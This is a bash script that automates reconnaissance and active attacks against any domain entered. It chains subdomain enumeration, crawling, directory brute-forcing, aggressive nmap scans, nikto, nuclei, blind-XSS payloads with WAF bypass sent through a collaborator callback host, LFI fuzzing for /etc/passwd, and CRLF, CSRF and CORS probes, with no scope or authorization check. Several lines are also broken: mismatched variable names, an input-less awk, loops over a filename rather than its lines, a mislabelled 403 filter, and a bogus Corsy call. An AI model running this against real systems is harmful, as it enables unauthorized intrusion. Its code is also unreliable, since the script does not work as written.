#!/bin/bash

PYTHON_VENV=$HOME/Python-Environments
TOOL_DIR=$HOME/tools
WORDLIST_DIR="$TOOLS_DIR/wordlists"
COLLABORATOR_LINK= #PLEASE ADD IT...
OUTPUT=$HOME/recon
mkdir -p "$OUTPUT"

read -p "Enter domain or URL: " DOMAIN
CLEAN_DOMAIN=$(echo "$DOMAIN" | sed -E 's~https?://~~' | sed 's~/.*~~')
DOMAIN_DIR="$OUTPUT/$CLEAN_DOMAIN"
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
mkdir -p "$DOMAIN_DIR"

echo "[+] Running subfinder..."
subfinder -d "$CLEAN_DOMAIN" -silent -o "$DOMAIN_DIR/subfinder.txt" > /dev/null 2>&1

echo "[+] Running assetfinder..."
assetfinder --subs-only "$CLEAN_DOMAIN" > "$DOMAIN_DIR/assetfinder.txt" 2>/dev/null

echo "[+] Combining and deduplicating..."
cat "$DOMAIN_DIR"/subfinder.txt "$DOMAIN_DIR"/assetfinder.txt | sort -u > "$DOMAIN_DIR/subdomains_$TIMESTAMP.txt"

SUBDOMAIN_COUNT=$(wc -l < "$DOMAIN_DIR/subdomains_$TIMESTAMP.txt")
echo "[+] Found $SUBDOMAIN_COUNT unique subdomains."

echo "[+] Probing for alive domains..."
httpx -l "$DOMAIN_DIR/subdomains_$TIMESTAMP.txt" -sc -td -ip -o "$DOMAIN_DIR/alive_$TIMESTAMP.txt" > /dev/null 2>&1
awk '{print $1}' > "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt"

ALIVE_COUNT=$(wc -l < "$DOMAIN_DIR/alive_$TIMESTAMP.txt")
echo "[+] Found $ALIVE_COUNT alive hosts"

echo "[+] Spidering alive domains 1/3..."
cat "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" | gau > "$DOMAIN_DIR/gausubs_$TIMESTAMP.txt"

echo "[+] Spidering alive domains 2/3..."
cat "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" | waybackurls > "$DOMAIN_DIR/waybacksubs_$TIMESTAMP.txt"

echo "[+] Spidering alive domains 3/3..."
katana -u "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" -d 5 -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o "$DOMAIN_DIR/katana_subs_$TIMESTAMP.txt"

echo "[+] Combining spidered URLS..."
cat "$DOMAIN_DIR/gausubs_$TIMESTAMP.txt" "$DOMAIN_DIR/waybacksubs_$TIMESTAMP.txt" "$DOMAIN_DIR/katana_subs_$TIMESTAMP.txt" | sort -u | tee "$DOMAIN_DIR/allurls_$TIMESTAMP.txt"

echo "[+] Collecting Cross Site scripting Parameters..."
cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | gf xss | tee "$DOMAIN_DIR/xss_params_$TIMESTAMP.txt"

echo "[+] Extracting js files..."
cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | grep -E "\.js$" >> "$DOMAIN_DIR/js_$TIMESTAMP.txt"

echo "[+] Filtering alive js files..."
cat "$DOMAIN_DIR/js_$TIMESTAMP.txt" | httpx -mc 200 -o "$DOMAIN_DIR/js_alive_$TIMESTAMP.txt"

echo "[+] Scanning for sensitive info 1/2..."
nuclei -l "$DOMAIN_DIR/js_alive_$TIMESTAMP.txt" -t "$HOME/nuclei-templates/http/exposures" -o "$DOMAIN_DIR/potential_secrets_$TIMESTAMP.txt"

echo "[+] Scanning for sensitive info 2/2..."
cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config" | tee "$DOMAIN_DIR/sensitive_file_extensions.txt"

echo "[+] Filtering 403s for fuzzing..."
grep -v " 403 " "$DOMAIN_DIR/alive_$TIMESTAMP.txt" | awk '{print $1}' > "$DOMAIN_DIR/fuzz_targets_$TIMESTAMP.txt"

echo "[+] FUZZING 403 subdomains..."
source $PYTHON_VENV/dirsearch/bin/activate
for SUB in "$DOMAIN_DIR/fuzz_targets_$TIMESTAMP.txt"
do
    echo "FUZZING $SUB..."
    python3 dirsearch -u $SUB -w $TOOLS_DIR/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x 403,301,429,302,404,500,501,502,503
done
deactivate

echo "Collecting parameters..."
arjun -l "$DOMAIN_DIR/subdomains_$TIMESTAMP.txt" > "$DOMAIN_DIR/arjun-param_$TIMESTAMP.txt"
paramspider -l "$DOMAIN_DIR/subdomains_$TIMESTAMP.txt" 
mv results $DOMAIN_DIR/

echo "[+] Extracting IPs for port scanning..."
grep -oP '\[\K[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$DOMAIN_DIR/alive_$TIMESTAMP.txt" | sort -u > "$DOMAIN_DIR/ip_targets.txt"

echo "[+] Port scanning extracted IPs with nmap..."
nmap -iL $DOMAIN_DIR/ip_targets.txt -sV -sC -A -T2

echo "[+] Filtering domains running IIS..."
grep -i "iis" "$DOMAIN_DIR/alive_$TIMESTAMP.txt" | awk '{print $1}' > "$DOMAIN_DIR/iis_hosts_$TIMESTAMP.txt"
IIS_COUNT=$(wc -l < "$DOMAIN_DIR/iis_hosts_$TIMESTAMP.txt")
echo "[+] Found $IIS_COUNT IIS hosts. Saved to $DOMAIN_DIR/iis_hosts_$TIMESTAMP.txt"

echo "[+] Attacking IIS URS in iis_hosts_$TIMESTAMP.txt with shortscan"
for SUB in "$DOMAIN_DIR/iis_hosts_$TIMESTAMP.txt"
do
    echo "[+]Starting attack on $SUB"
    shortscan $SUB
done

echo "[+] Performing basic vulnerability scanning 1/2..."
for SUB in "$DOMAIN_DIR/subdomains_$TIMESTAMP.txt"
do
    echo "[+] Starting vulnerability scanning on $SUB"
    nikto -host $SUB | tee "$DOMAIN_DIR/nikto_results_$TIMESTAMP.txt"
done

echo '[+] Performing basic vulnerability scanning 2/2...'
nuclei -l $DOMAIN_DIR/subdomains_$TIMESTAMP.txt -o "$DOMAIN_DIR/nuclei_results_$TIMESTAMP.txt"

echo "[+] Scanning for subdomain takeover 1/3..."
subzy run --targets "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" --verify_ssl --hide_fails | tee "$DOMAIN_DIR/subzy_$TIMESTAMP.txt"

echo "[+] Scanning for subdomain takeover 2/3..."
cat "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" | dnsx -cname -ns -o "$DOMAIN_DIR/cnamenssub.txt"

echo "[+] Scanning for subdomain takeover 3/3..."
nuclei -l "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" -t takeover-detection -o "$DOMAIN_DIR/nuclei_takeover_$TIMESTAMP.txt"

echo "[+] Scanning for Cross Site Scripting 1/4..."
cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | Gxss | kxss | tee "$DOMAIN_DIR/xss_output.txt"

echo "[+] Scanning for Cross Site Scripting 2/4..."
cat "$DOMAIN_DIR/xss_params_$TIMESTAMP.txt" | dalfox pipe --blind $COLLABORATOR_LINK --waf-bypass --silence

echo "[+] Scanning for Cross Site Scripting 3/4..."
cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high

echo "[+] Scanning for Cross Site Scripting 4/4..."
cat "$DOMAIN_DIR/js_alive_$TIMESTAMP.txt" | Gxss -c 100 | sort -u | dalfox pipe -o "$DOMAIN_DIR/dom_xss_results.txt"

echo "[+] Scanning for Local File Inclusion..."
echo $DOMAIN | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w "$TOOLS_DIR/wordlists/payloads/lfi.txt" -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

echo "[+] Scanning for CRLF injection..."
crlfuzz -l "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | tee "$DOMAIN_DIR/crlf_results_$TIMESTAMP.txt"

echo "[+] Scanning for CSRF..."
echo "[+] Starting Python Virtual Environment for CSRF Scanner..."
source "$PYTHON_VENV/csrfscan/bin/activate"
python3 "$TOOLS_DIR/csrfscan/bolt.py" -u $DOMAIN -l 3 | tee "$DOMAIN_DIR/csrf_results_$TIMESTAMP.txt"

echo "[+] Scanning for CORS..."
echo "[+] Starting Python Virtual Environment for Corsy..."
source "$PYTHON_VENV/corsy/bin/activate"
python3 "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | tee "$DOMAIN_DIR/cors_results_$TIMESTAMP.txt"


echo "[✓] Finished! Results in $DOMAIN_DIR"
